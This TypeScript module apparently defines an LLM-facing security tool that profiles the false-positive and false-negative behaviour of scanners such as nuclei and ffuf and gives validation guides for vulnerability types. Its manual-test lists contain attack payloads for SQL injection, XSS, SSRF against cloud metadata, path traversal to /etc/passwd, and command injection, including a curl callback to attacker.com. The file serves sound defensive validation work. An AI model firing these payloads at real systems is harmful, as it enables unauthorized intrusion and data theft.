/**
 * @license
 * Copyright 2025 DarkCoder
 * SPDX-License-Identifier: Apache-2.0
 */

/**
 * Tool Validation & Accuracy Guide
 *
 * This module provides guidance on interpreting security tool results,
 * identifying false positives (FP), detecting true negatives (TN),
 * and properly validating findings before reporting.
 *
 * Key Concepts:
 * - False Positive (FP): Tool reports vulnerability that doesn't exist
 * - True Negative (TN): Tool misses a vulnerability that exists
 * - False Negative (FN): Same as TN - missed vulnerability
 * - True Positive (TP): Correctly identified real vulnerability
 *
 * This tool helps LLMs understand tool limitations and validate findings.
 */

import { BaseDeclarativeTool, Kind, type ToolResult } from './tools.js';
import { BaseToolInvocation } from './tools.js';
import { ToolNames, ToolDisplayNames } from './tool-names.js';

/**
 * Tool accuracy profile
 */
interface ToolAccuracyProfile {
  name: string;
  description: string;
  fpRate: 'low' | 'medium' | 'high';
  fnRate: 'low' | 'medium' | 'high';
  fpCauses: string[];
  fnCauses: string[];
  validationSteps: string[];
  bestPractices: string[];
  limitations: string[];
  confidence: {
    high: string[];
    medium: string[];
    low: string[];
  };
}

/**
 * Comprehensive tool accuracy profiles
 */
const TOOL_PROFILES: Record<string, ToolAccuracyProfile> = {
  nuclei: {
    name: 'Nuclei Vulnerability Scanner',
    description:
      'Template-based vulnerability scanner with 10,000+ community templates',
    fpRate: 'medium',
    fnRate: 'medium',
    fpCauses: [
      'Generic pattern matching without context validation',
      'Template regex too broad (matches similar but safe patterns)',
      'Version detection based on headers that can be spoofed',
      'WAF/IPS modifying responses to appear vulnerable',
      'Default pages falsely matching vulnerability signatures',
      'CDN/proxy responses triggering false matches',
      'Rate limiting responses misinterpreted as vulnerabilities',
      'Custom error pages matching vulnerability patterns',
      'Outdated templates with incorrect detection logic',
    ],
    fnCauses: [
      'WAF blocking malicious payloads before reaching target',
      'Custom/proprietary applications not in template database',
      'Non-standard ports or paths not scanned',
      'Authentication-protected vulnerabilities not tested',
      'Rate limiting preventing complete scan',
      'Template not updated for new vulnerability variants',
      'HTTPS certificate errors causing skipped tests',
      'Geo-blocking preventing access to vulnerable endpoints',
      'Load balancer distributing requests to patched servers',
    ],
    validationSteps: [
      '1. Check curl-command in result - replay manually',
      '2. Verify matched pattern in actual response',
      '3. Compare with manual browser request',
      '4. Test with different User-Agent strings',
      '5. Check if CVE applies to detected version',
      '6. Verify exploit prerequisites are met',
      '7. Test from different IP/network if possible',
      '8. Check template maturity (author, references)',
    ],
    bestPractices: [
      'Always validate critical/high findings manually',
      'Use -validate flag for template syntax verification',
      'Run with -debug to see request/response details',
      'Cross-reference with other tools (Nikto, Nmap scripts)',
      'Check template last-update date',
      'Filter by severity to focus on impactful issues',
      'Use -rate-limit to avoid triggering WAF',
    ],
    limitations: [
      'Cannot detect business logic vulnerabilities',
      'Limited to known vulnerability patterns',
      'May miss zero-day or custom vulnerabilities',
      'Cannot fully test authenticated sections',
      'Template quality varies by contributor',
      'May overwhelm small targets with requests',
    ],
    confidence: {
      high: [
        'CVE match with version confirmation in response body',
        'Extracted sensitive data (credentials, API keys)',
        'Command execution output visible',
        'SQL error messages with query details',
        'File content matches expected sensitive file',
      ],
      medium: [
        'Version number matches but not in response body',
        'Generic error pattern without details',
        'Header-only version detection',
        'Default page detection without version',
      ],
      low: [
        'Status code only matches',
        'Content-length only matches',
        'Generic regex without context',
        'info severity findings',
      ],
    },
  },

  ffuf: {
    name: 'ffuf Web Fuzzer',
    description:
      'Fast web fuzzer for directory, vhost, and parameter discovery',
    fpRate: 'high',
    fnRate: 'low',
    fpCauses: [
      'Wildcard DNS returning same response for all subdomains',
      'Custom 404 pages with 200 status code',
      'WAF blocking with 200 status but different content',
      'Generic error pages for all paths',
      'Load balancer health checks matching patterns',
      'Rate limiting returning 200 with captcha page',
      'Authentication redirect (302) to login page',
      'Soft 404s - valid status but "not found" content',
      'CDN edge responses for non-existent content',
      'Directory index enabled showing parent listings',
    ],
    fnCauses: [
      'Wordlist missing target directory/file names',
      'Case sensitivity not matching server OS',
      'Extension not included in fuzzing list',
      'Rate limiting blocking before discovery',
      'WAF blocking fuzzing patterns',
      'Geo/IP restrictions on certain paths',
      'Authentication required for path access',
      'Non-standard URL encoding required',
      'Virtualized paths requiring specific headers',
    ],
    validationSteps: [
      '1. ALWAYS use auto-calibration (-ac) for baseline',
      '2. Manually verify interesting status codes in browser',
      '3. Check response content, not just size/status',
      '4. Compare response to known 404 page',
      '5. Test with/without trailing slash',
      '6. Verify discovered path returns expected content type',
      '7. Check if path requires authentication',
      '8. Test with different HTTP methods (GET, POST, HEAD)',
    ],
    bestPractices: [
      'MANDATORY: Use -ac (auto-calibrate) to filter noise',
      'Use -mc to match only specific status codes (200,301,302,403)',
      'Use -fs to filter by specific response size',
      'Use -fw to filter by word count',
      'Start with smaller wordlist, expand if needed',
      'Check response time for blind detection (-ft)',
      'Save results with -o for later analysis',
      'Use -H for custom headers when needed',
    ],
    limitations: [
      'Cannot detect application logic issues',
      'Limited by wordlist quality and coverage',
      'May trigger security alerts',
      'Cannot enumerate truly random/UUID paths',
      'Slow against rate-limited targets',
      'Cannot handle JavaScript-rendered content',
    ],
    confidence: {
      high: [
        'Unique response size/content vs baseline',
        'Different status code than calibration baseline',
        'Response contains expected file content',
        'Admin panel with login form',
        'API endpoint returning JSON data',
      ],
      medium: [
        '403 Forbidden (exists but restricted)',
        '301/302 redirect to different path',
        'Response time significantly different',
        'Directory listing visible',
      ],
      low: [
        'Same size as baseline but different status',
        '200 with generic content',
        'Response matches soft 404 pattern',
        'Wildcard behavior detected',
      ],
    },
  },

  ssl_scanner: {
    name: 'SSL/TLS Scanner',
    description: 'SSL/TLS configuration and vulnerability assessment',
    fpRate: 'low',
    fnRate: 'low',
    fpCauses: [
      'Load balancer with multiple backend configs',
      'CDN terminating SSL differently than origin',
      'Outdated vulnerability database',
      'Protocol downgrade detection during TLS negotiation',
      'Cipher ordering detection with session resumption',
      'Self-signed cert in internal/dev environments',
      'Wildcard certificates flagged incorrectly',
    ],
    fnCauses: [
      'SNI not enabled missing virtual hosts',
      'STARTTLS not tested for mail servers',
      'Non-standard ports not scanned',
      'Backend SSL config hidden by CDN/proxy',
      'Protocol/cipher disabled at firewall level',
      'Timeout before complete cipher enumeration',
      'Certificate pinning preventing analysis',
    ],
    validationSteps: [
      '1. Verify with multiple SSL testing tools (ssllabs, testssl.sh)',
      '2. Check if CDN/WAF is terminating SSL',
      '3. Test against direct IP (bypass CDN) if possible',
      '4. Verify certificate chain manually',
      '5. Check vulnerability CVE against actual software version',
      '6. Test with different TLS client capabilities',
      '7. Verify HSTS is actually enforced in browser',
    ],
    bestPractices: [
      'Test both hostname and IP address',
      'Use --sni for virtual hosted environments',
      'Check all ports (443, 8443, etc.)',
      'Test STARTTLS for mail servers',
      'Cross-reference with SSL Labs online scanner',
      'Check certificate expiration proactively',
      'Verify revocation status (OCSP, CRL)',
    ],
    limitations: [
      'Cannot detect application-layer SSL issues',
      'May not enumerate all cipher suites if server limits',
      'Cannot test SSL configurations behind WAF',
      'Limited STARTTLS protocol support',
      'Cannot detect certificate pinning bypasses',
    ],
    confidence: {
      high: [
        'SSLv3/TLS1.0 enabled - protocol negotiation confirmed',
        'Heartbleed - memory leak response detected',
        'Expired certificate - date verified',
        'Self-signed certificate - chain validation failed',
        'Missing HSTS header - verified in response',
      ],
      medium: [
        'Weak cipher suites - depends on client support',
        'Certificate key size warnings',
        'OCSP stapling not enabled',
        'Cipher order preference issues',
      ],
      low: [
        'TLS 1.2 without 1.3 (often acceptable)',
        'Session resumption configuration',
        'Certificate transparency log absence',
      ],
    },
  },

  censys: {
    name: 'Censys Search',
    description: 'Internet-wide service discovery and banner grabbing',
    fpRate: 'medium',
    fnRate: 'high',
    fpCauses: [
      'Outdated scan data (hours to weeks old)',
      'Honeypots appearing as real services',
      'Misidentified service banners',
      'Dynamic IP reassignment to different host',
      'Load balancer showing different backends',
      'CDN nodes appearing as target infrastructure',
      'Shared hosting IP showing multiple services',
    ],
    fnCauses: [
      'Target not in Censys index (never scanned)',
      'Firewall blocking Censys scanner IP ranges',
      'Service on non-standard port not scanned',
      'Recent changes not yet indexed',
      'Geo-blocked from Censys scanners',
      'Rate-limited Censys requests',
      'Internal services not internet-facing',
    ],
    validationSteps: [
      '1. Verify data freshness (check last_update timestamp)',
      '2. Confirm service is still running with live scan',
      '3. Cross-reference with Censys or direct scanning',
      '4. Verify IP still belongs to target organization',
      '5. Check if service is honeypot',
      '6. Validate version info with direct banner grab',
    ],
    bestPractices: [
      'Always check data timestamp',
      'Cross-reference with live scanning',
      'Use multiple search filters for accuracy',
      'Verify organization ownership of IPs',
      'Check for honeypot indicators',
      'Use facets to understand data distribution',
    ],
    limitations: [
      'Data staleness - not real-time',
      'Limited to indexed services',
      'Cannot scan internal networks',
      'Rate limited for free users',
      'May include honeypots in results',
      'Cannot verify service exploitation',
    ],
    confidence: {
      high: [
        'Recent scan timestamp (< 7 days)',
        'Multiple corroborating data points',
        'Known CVE matched with version banner',
        'Verified organization ownership',
      ],
      medium: [
        'Scan 7-30 days old',
        'Banner matches but version unclear',
        'Multiple services on single IP',
      ],
      low: [
        'Scan > 30 days old',
        'Generic banner without version',
        'Single data point without corroboration',
      ],
    },
  },

  wayback_machine: {
    name: 'Wayback Machine',
    description: 'Historical web archive for reconnaissance',
    fpRate: 'low',
    fnRate: 'high',
    fpCauses: [
      'Archived content no longer exists',
      'Archived misconfigurations already fixed',
      'Different environment (dev vs prod)',
      'Archived third-party content',
    ],
    fnCauses: [
      'Target never archived',
      'robots.txt blocked archiving',
      'Dynamic content not captured',
      'JavaScript-rendered content missed',
      'Recent content not yet archived',
      'Authenticated content not archived',
    ],
    validationSteps: [
      '1. Verify if discovered path still exists',
      '2. Check if sensitive file is still accessible',
      '3. Compare archived version with current',
      '4. Test if old endpoints still function',
      '5. Verify credentials/tokens not already rotated',
    ],
    bestPractices: [
      'Check multiple archive dates',
      'Look for removed sensitive files',
      'Find old API endpoints',
      'Discover historical tech stack',
      'Combine with current scanning',
    ],
    limitations: [
      'Historical only - not current state',
      'Cannot archive dynamic content well',
      'May miss sensitive pages (excluded)',
      'JavaScript apps poorly archived',
    ],
    confidence: {
      high: [
        'Archived sensitive file still accessible today',
        'Archived credentials still valid',
        'Old endpoint still functional',
      ],
      medium: [
        'Tech stack info from old pages',
        'Discovered paths need verification',
      ],
      low: ['Archived content likely outdated', 'Paths may not exist anymore'],
    },
  },

  web_tech: {
    name: 'Web Technology Detection',
    description: 'Identify web technologies, frameworks, and versions',
    fpRate: 'medium',
    fnRate: 'medium',
    fpCauses: [
      'Generic patterns matching multiple technologies',
      'Cached/outdated technology signatures',
      'Header spoofing by security tools',
      'WAF injecting misleading headers',
      'Version removed from response',
      'Multiple frameworks with similar signatures',
    ],
    fnCauses: [
      'Custom/proprietary frameworks',
      'Heavily customized CMS installations',
      'Technologies loaded via JavaScript',
      'Server headers stripped by proxy',
      'Non-standard implementations',
      'New technology versions not in database',
    ],
    validationSteps: [
      '1. Verify technology in page source',
      '2. Check for technology-specific files',
      '3. Validate version against known signatures',
      '4. Cross-reference with error messages',
      '5. Check JavaScript libraries directly',
    ],
    bestPractices: [
      'Use multiple detection tools (Wappalyzer, WhatWeb)',
      'Manually verify critical technologies',
      'Check both headers and response body',
      'Look for version-specific behaviors',
      'Test technology-specific vulnerabilities',
    ],
    limitations: [
      'Cannot detect all technologies',
      'Version detection often inaccurate',
      'Cannot identify custom code',
      'May miss obfuscated technologies',
    ],
    confidence: {
      high: [
        'Version string in response body',
        'Technology-specific file found',
        'Error message reveals technology',
      ],
      medium: [
        'Header indicates technology',
        'Cookie pattern matches',
        'URL structure suggests framework',
      ],
      low: ['Generic pattern match only', 'Similar technology signatures'],
    },
  },
};

/**
 * Validation guidance for specific vulnerability types
 */
const VULN_VALIDATION_GUIDES: Record<
  string,
  {
    name: string;
    validationSteps: string[];
    fpIndicators: string[];
    tpIndicators: string[];
    manualTests: string[];
  }
> = {
  sqli: {
    name: 'SQL Injection',
    validationSteps: [
      '1. Test with single quote - look for SQL error',
      "2. Test UNION-based: ' UNION SELECT NULL--",
      "3. Test boolean-based: ' AND 1=1-- vs ' AND 1=2--",
      "4. Test time-based: ' AND SLEEP(5)--",
      '5. Check if response differs between payloads',
      '6. Use SQLMap to confirm with -v3 --level=3',
    ],
    fpIndicators: [
      'Generic error not containing SQL syntax',
      'WAF blocking and returning error page',
      'Input validation removing quotes silently',
      'Parameterized query preventing injection',
      'Error comes from input validation not SQL',
    ],
    tpIndicators: [
      'SQL syntax error mentioning query',
      'Database type revealed in error',
      'Different response for 1=1 vs 1=2',
      'Response delayed with SLEEP payload',
      'UNION SELECT returns additional data',
      'Extracted database name/version/tables',
    ],
    manualTests: [
      'sqlmap -u "URL" --batch --level=3 --risk=2',
      "Test: id=1' AND '1'='1",
      "Test: id=1' AND '1'='2",
      'Test: id=1 ORDER BY 10--',
      "Test: id=1'; WAITFOR DELAY '0:0:5'--",
    ],
  },

  xss: {
    name: 'Cross-Site Scripting',
    validationSteps: [
      '1. Check if input is reflected in response',
      '2. Identify output context (HTML, JS, attribute)',
      '3. Test context-appropriate payload',
      '4. Verify payload executes in browser',
      '5. Check for encoding/filtering',
      '6. Test DOM XSS with source/sink analysis',
    ],
    fpIndicators: [
      'Input is HTML-encoded in output',
      'CSP blocks script execution',
      'Payload reflected but not executed',
      'X-XSS-Protection blocking',
      'Input filtered/sanitized properly',
    ],
    tpIndicators: [
      'alert() executes in browser',
      'JavaScript code runs in page context',
      'Stored payload persists and executes',
      'DOM manipulation successful',
      'Event handler executes payload',
    ],
    manualTests: [
      'Test: <script>alert(1)</script>',
      'Test: <img src=x onerror=alert(1)>',
      "Test: '-alert(1)-'",
      'Test: javascript:alert(1)',
      'Verify in actual browser (not just curl)',
    ],
  },

  ssrf: {
    name: 'Server-Side Request Forgery',
    validationSteps: [
      '1. Test with external webhook (Burp Collaborator)',
      '2. Test internal IPs (127.0.0.1, 169.254.169.254)',
      '3. Test cloud metadata endpoints',
      '4. Check for URL scheme restrictions',
      '5. Test bypass techniques (IP encoding, redirects)',
    ],
    fpIndicators: [
      'URL validated and blocked',
      'Cannot reach internal hosts',
      'Only HTTP/HTTPS allowed',
      'Whitelist-based URL validation',
      'No callback received',
    ],
    tpIndicators: [
      'External callback received',
      'Internal service response returned',
      'Cloud metadata accessible',
      'Internal port scan possible',
      'File protocol works (file:///etc/passwd)',
    ],
    manualTests: [
      'Test: http://127.0.0.1:80',
      'Test: http://169.254.169.254/latest/meta-data/',
      'Test: http://[::1]:80',
      'Test: http://0x7f.0.0.1',
      'Use Burp Collaborator for OOB',
    ],
  },

  lfi: {
    name: 'Local File Inclusion',
    validationSteps: [
      '1. Test with known file: /etc/passwd',
      '2. Try path traversal: ../../../etc/passwd',
      '3. Test null byte: file.php%00.txt',
      '4. Test encoding: ..%2f..%2fetc/passwd',
      '5. Check if file content returned',
    ],
    fpIndicators: [
      'Path normalized before processing',
      'Whitelist-based file validation',
      'Only allowed extensions processed',
      'chroot preventing traversal',
      'Error message but no file content',
    ],
    tpIndicators: [
      '/etc/passwd content visible',
      'Windows files (C:\\boot.ini) accessible',
      'Application source code revealed',
      'Log file content displayed',
      'PHP wrapper (php://filter) works',
    ],
    manualTests: [
      'Test: ?file=../../../etc/passwd',
      'Test: ?file=....//....//etc/passwd',
      'Test: ?file=/etc/passwd%00.png',
      'Test: ?file=php://filter/convert.base64-encode/resource=index.php',
    ],
  },

  rce: {
    name: 'Remote Code Execution',
    validationSteps: [
      '1. Test with sleep/delay command',
      '2. Use out-of-band detection (DNS, HTTP)',
      '3. Test command concatenation (;, |, &&)',
      '4. Check for command output in response',
      '5. Test in blind context with timing',
    ],
    fpIndicators: [
      'Input sanitization blocking commands',
      'Sandbox/container limiting execution',
      'Command not actually executed',
      'Error from input validation not shell',
      'AppArmor/SELinux blocking',
    ],
    tpIndicators: [
      'Command output visible in response',
      'Time delay matches sleep command',
      'DNS/HTTP callback received',
      'File created/modified on server',
      'Reverse shell connects back',
    ],
    manualTests: [
      'Test: ; sleep 10',
      'Test: | curl http://attacker.com/callback',
      'Test: `id`',
      'Test: $(whoami)',
      'Use Burp Collaborator for blind RCE',
    ],
  },

  idor: {
    name: 'Insecure Direct Object Reference',
    validationSteps: [
      '1. Identify resource identifiers in URLs/params',
      '2. Create two test accounts',
      '3. Access resource from other account',
      '4. Check if authorization enforced',
      '5. Test sequential IDs, UUIDs, encoded values',
    ],
    fpIndicators: [
      'Proper authorization check in place',
      'Resource belongs to requesting user',
      'Object reference is authenticated',
      'UUID/random ID prevents guessing',
      'Access denied response returned',
    ],
    tpIndicators: [
      'Can access other users data',
      'Sequential IDs enumerable',
      'No authorization check',
      'Can modify other users resources',
      'Sensitive data exposed',
    ],
    manualTests: [
      'Test: /api/user/123 vs /api/user/124',
      'Test with different auth tokens',
      'Test horizontal privilege escalation',
      'Test vertical privilege escalation',
      'Fuzz numeric parameters',
    ],
  },
};

/**
 * Tool validation parameters
 */
interface ValidationParams {
  /** What to get guidance for */
  operation:
    | 'tool_profile'
    | 'vuln_validation'
    | 'result_analysis'
    | 'confidence_check';

  /** Tool name for profile */
  tool?: string;

  /** Vulnerability type for validation guidance */
  vulnType?: string;

  /** Raw scan result to analyze */
  scanResult?: string;

  /** Tool that produced the result */
  sourceTool?: string;

  /** Severity of finding */
  severity?: string;

  /** Get detailed validation steps */
  detailed?: boolean;
}

/**
 * Validation invocation handler
 */
class ValidationInvocation extends BaseToolInvocation<
  ValidationParams,
  ToolResult
> {
  getDescription(): string {
    return `Getting ${this.params.operation} guidance`;
  }

  async execute(): Promise<ToolResult> {
    const { operation } = this.params;

    let output: string;

    switch (operation) {
      case 'tool_profile':
        output = this.getToolProfile();
        break;
      case 'vuln_validation':
        output = this.getVulnValidation();
        break;
      case 'result_analysis':
        output = this.analyzeResult();
        break;
      case 'confidence_check':
        output = this.getConfidenceGuidance();
        break;
      default:
        output = this.getAllProfiles();
    }

    return {
      llmContent: output,
      returnDisplay: output,
    };
  }

  private getToolProfile(): string {
    const { tool, detailed } = this.params;

    if (!tool) {
      return this.listAvailableTools();
    }

    const profile = TOOL_PROFILES[tool.toLowerCase()];
    if (!profile) {
      return `Unknown tool: ${tool}\n\nAvailable: ${Object.keys(TOOL_PROFILES).join(', ')}`;
    }

    let output = `# ${profile.name} - Accuracy Profile\n\n`;
    output += `${profile.description}\n\n`;

    output += `## Accuracy Rates\n`;
    output += `| Metric | Rate | Meaning |\n`;
    output += `|--------|------|--------|\n`;
    output += `| False Positive Rate | **${profile.fpRate.toUpperCase()}** | ${this.rateDescription(profile.fpRate, 'fp')} |\n`;
    output += `| False Negative Rate | **${profile.fnRate.toUpperCase()}** | ${this.rateDescription(profile.fnRate, 'fn')} |\n\n`;

    output += `## ⚠️ False Positive Causes\n`;
    output += `Things that make this tool report vulnerabilities that don't exist:\n`;
    profile.fpCauses.forEach((cause, i) => {
      output += `${i + 1}. ${cause}\n`;
    });

    output += `\n## ❌ False Negative (Missed) Causes\n`;
    output += `Things that make this tool miss real vulnerabilities:\n`;
    profile.fnCauses.forEach((cause, i) => {
      output += `${i + 1}. ${cause}\n`;
    });

    output += `\n## ✅ Validation Steps\n`;
    output += `Always perform these steps to validate findings:\n`;
    profile.validationSteps.forEach((step) => {
      output += `${step}\n`;
    });

    output += `\n## 🎯 Confidence Indicators\n\n`;
    output += `### HIGH Confidence (likely true positive)\n`;
    profile.confidence.high.forEach((c) => (output += `- ✅ ${c}\n`));
    output += `\n### MEDIUM Confidence (needs verification)\n`;
    profile.confidence.medium.forEach((c) => (output += `- ⚡ ${c}\n`));
    output += `\n### LOW Confidence (likely false positive)\n`;
    profile.confidence.low.forEach((c) => (output += `- ⚠️ ${c}\n`));

    if (detailed) {
      output += `\n## 💡 Best Practices\n`;
      profile.bestPractices.forEach((bp) => (output += `- ${bp}\n`));

      output += `\n## 🚫 Limitations\n`;
      profile.limitations.forEach((lim) => (output += `- ${lim}\n`));
    }

    return output;
  }

  private getVulnValidation(): string {
    const { vulnType, detailed } = this.params;

    if (!vulnType) {
      return this.listVulnTypes();
    }

    const guide = VULN_VALIDATION_GUIDES[vulnType.toLowerCase()];
    if (!guide) {
      return `Unknown vulnerability type: ${vulnType}\n\nAvailable: ${Object.keys(VULN_VALIDATION_GUIDES).join(', ')}`;
    }

    let output = `# ${guide.name} - Validation Guide\n\n`;

    output += `## Validation Steps\n`;
    guide.validationSteps.forEach((step) => (output += `${step}\n`));

    output += `\n## ✅ True Positive Indicators\n`;
    output += `If you see these, the vulnerability is REAL:\n`;
    guide.tpIndicators.forEach((tp) => (output += `- ✅ ${tp}\n`));

    output += `\n## ⚠️ False Positive Indicators\n`;
    output += `If you see these, it's likely NOT vulnerable:\n`;
    guide.fpIndicators.forEach((fp) => (output += `- ❌ ${fp}\n`));

    if (detailed) {
      output += `\n## 🔧 Manual Test Commands\n`;
      output += '```\n';
      guide.manualTests.forEach((test) => (output += `${test}\n`));
      output += '```\n';
    }

    return output;
  }

  private analyzeResult(): string {
    const { scanResult, sourceTool, severity } = this.params;

    if (!scanResult) {
      return 'Error: scanResult parameter required for result analysis';
    }

    let output = `# Result Analysis\n\n`;

    if (sourceTool) {
      const profile = TOOL_PROFILES[sourceTool.toLowerCase()];
      if (profile) {
        output += `## Tool: ${profile.name}\n`;
        output += `- FP Rate: ${profile.fpRate.toUpperCase()}\n`;
        output += `- FN Rate: ${profile.fnRate.toUpperCase()}\n\n`;
      }
    }

    output += `## Validation Recommendations\n\n`;
    output += `Given the ${severity || 'unknown'} severity finding:\n\n`;

    if (severity === 'critical' || severity === 'high') {
      output += `### ⚡ HIGH PRIORITY - Immediate Validation Required\n\n`;
      output += `1. **Manual Verification**: Replay the exact request\n`;
      output += `2. **Browser Test**: Verify in actual browser\n`;
      output += `3. **Cross-Tool Validation**: Use secondary tool to confirm\n`;
      output += `4. **PoC Development**: Create working proof of concept\n`;
      output += `5. **Impact Assessment**: Determine actual exploitability\n`;
    } else {
      output += `### Medium/Low Priority Validation\n\n`;
      output += `1. Verify finding manually when time permits\n`;
      output += `2. Cross-reference with other findings\n`;
      output += `3. Document for potential later investigation\n`;
    }

    output += `\n## General Validation Workflow\n`;
    output += '```\n';
    output += `1. Check scan result details (matched pattern, response)\n`;
    output += `2. Replay request manually (curl, browser, Burp)\n`;
    output += `3. Compare expected vs actual response\n`;
    output += `4. Test with variations to confirm\n`;
    output += `5. Document PoC if confirmed\n`;
    output += '```\n';

    return output;
  }

  private getConfidenceGuidance(): string {
    let output = `# Confidence Assessment Guide\n\n`;

    output += `## Quick Confidence Checklist\n\n`;
    output += `| Question | HIGH if Yes | LOW if No |\n`;
    output += `|----------|-------------|----------|\n`;
    output += `| Can you extract actual data? | ✅ | ⚠️ |\n`;
    output += `| Does the response contain specific error? | ✅ | ⚠️ |\n`;
    output += `| Can you reproduce consistently? | ✅ | ❌ |\n`;
    output += `| Does manual testing confirm? | ✅ | ❌ |\n`;
    output += `| Is the payload actually executed? | ✅ | ❌ |\n`;
    output += `| Can you demonstrate impact? | ✅ | ⚠️ |\n\n`;

    output += `## When to Trust Tool Results\n\n`;
    output += `### TRUST the result when:\n`;
    output += `- Extracted sensitive data visible\n`;
    output += `- Command execution output returned\n`;
    output += `- Multiple tools confirm same finding\n`;
    output += `- Manual replay produces same result\n`;
    output += `- CVE matches confirmed software version\n\n`;

    output += `### VERIFY before reporting when:\n`;
    output += `- Status code is only indicator\n`;
    output += `- Pattern match without context\n`;
    output += `- Version detected from header only\n`;
    output += `- Single tool finding with no corroboration\n`;
    output += `- WAF or CDN in front of target\n\n`;

    output += `### LIKELY FALSE POSITIVE when:\n`;
    output += `- Generic error page triggered\n`;
    output += `- Same response for different payloads\n`;
    output += `- WAF blocking visible in response\n`;
    output += `- Template matches on static content\n`;
    output += `- Honeypot indicators present\n`;

    return output;
  }

  private listAvailableTools(): string {
    let output = `# Available Tool Profiles\n\n`;
    output += `| Tool | FP Rate | FN Rate | Description |\n`;
    output += `|------|---------|---------|-------------|\n`;

    Object.entries(TOOL_PROFILES).forEach(([key, profile]) => {
      output += `| ${key} | ${profile.fpRate} | ${profile.fnRate} | ${profile.description.substring(0, 50)}... |\n`;
    });

    output += `\nUse: \`tool_validation operation=tool_profile tool=nuclei\` for detailed profile\n`;
    return output;
  }

  private listVulnTypes(): string {
    let output = `# Available Vulnerability Validation Guides\n\n`;

    Object.entries(VULN_VALIDATION_GUIDES).forEach(([key, guide]) => {
      output += `- **${key}**: ${guide.name}\n`;
    });

    output += `\nUse: \`tool_validation operation=vuln_validation vulnType=sqli\` for guide\n`;
    return output;
  }

  private getAllProfiles(): string {
    let output = `# Tool Validation & Accuracy Guide\n\n`;
    output += `This tool helps you understand security tool limitations and validate findings.\n\n`;

    output += `## Operations\n\n`;
    output += `| Operation | Description |\n`;
    output += `|-----------|-------------|\n`;
    output += `| tool_profile | Get accuracy profile for a specific tool |\n`;
    output += `| vuln_validation | Get validation guide for vulnerability type |\n`;
    output += `| result_analysis | Analyze a scan result for confidence |\n`;
    output += `| confidence_check | Get general confidence assessment guidance |\n\n`;

    output += `## Tool FP/FN Summary\n\n`;
    output += `| Tool | False Positive | False Negative | Trust Level |\n`;
    output += `|------|----------------|----------------|-------------|\n`;

    Object.entries(TOOL_PROFILES).forEach(([key, profile]) => {
      const trust = this.calculateTrust(profile.fpRate, profile.fnRate);
      output += `| ${key} | ${profile.fpRate} | ${profile.fnRate} | ${trust} |\n`;
    });

    output += `\n## Key Insight\n\n`;
    output += `> **ALWAYS validate critical/high findings manually before reporting.**\n`;
    output += `> Automated tools are for discovery, human analysis is for verification.\n`;

    return output;
  }

  private rateDescription(rate: string, type: 'fp' | 'fn'): string {
    if (type === 'fp') {
      switch (rate) {
        case 'low':
          return 'Findings usually accurate';
        case 'medium':
          return 'Verify findings before reporting';
        case 'high':
          return 'Many findings need validation';
        default:
          return 'Unknown';
      }
    } else {
      switch (rate) {
        case 'low':
          return 'Catches most vulnerabilities';
        case 'medium':
          return 'May miss some issues';
        case 'high':
          return 'Supplement with other tools';
        default:
          return 'Unknown';
      }
    }
  }

  private calculateTrust(fpRate: string, fnRate: string): string {
    if (fpRate === 'low' && fnRate === 'low') return '🟢 HIGH';
    if (fpRate === 'high' || fnRate === 'high') return '🔴 LOW';
    return '🟡 MEDIUM';
  }
}

/**
 * Tool Validation Tool
 */
export class ToolValidationTool extends BaseDeclarativeTool<
  ValidationParams,
  ToolResult
> {
  static readonly Name = ToolNames.TOOL_VALIDATION;

  constructor() {
    super(
      ToolValidationTool.Name,
      ToolDisplayNames.TOOL_VALIDATION,
      `Security tool validation and accuracy guide. Helps understand false positives,
false negatives, and how to properly validate findings from security tools.

Use this tool to:
- Get accuracy profiles for tools (nuclei, ffuf, censys, etc.)
- Get validation guides for vulnerability types (sqli, xss, ssrf, etc.)
- Analyze scan results for confidence assessment
- Understand when to trust vs verify tool output

CRITICAL: Always validate critical/high severity findings manually.`,
      Kind.Fetch,
      {
        type: 'object',
        properties: {
          operation: {
            type: 'string',
            enum: [
              'tool_profile',
              'vuln_validation',
              'result_analysis',
              'confidence_check',
            ],
            description: 'What guidance to get',
          },
          tool: {
            type: 'string',
            description:
              'Tool name for profile (nuclei, ffuf, ssl_scanner, censys, wayback_machine, web_tech)',
          },
          vulnType: {
            type: 'string',
            description:
              'Vulnerability type for validation guide (sqli, xss, ssrf, lfi, rce, idor)',
          },
          scanResult: {
            type: 'string',
            description: 'Raw scan result to analyze',
          },
          sourceTool: {
            type: 'string',
            description: 'Tool that produced the result',
          },
          severity: {
            type: 'string',
            description:
              'Severity of finding (critical, high, medium, low, info)',
          },
          detailed: {
            type: 'boolean',
            description: 'Include detailed best practices and limitations',
          },
        },
        required: ['operation'],
      },
    );
  }

  protected createInvocation(params: ValidationParams): ValidationInvocation {
    return new ValidationInvocation(params);
  }
}
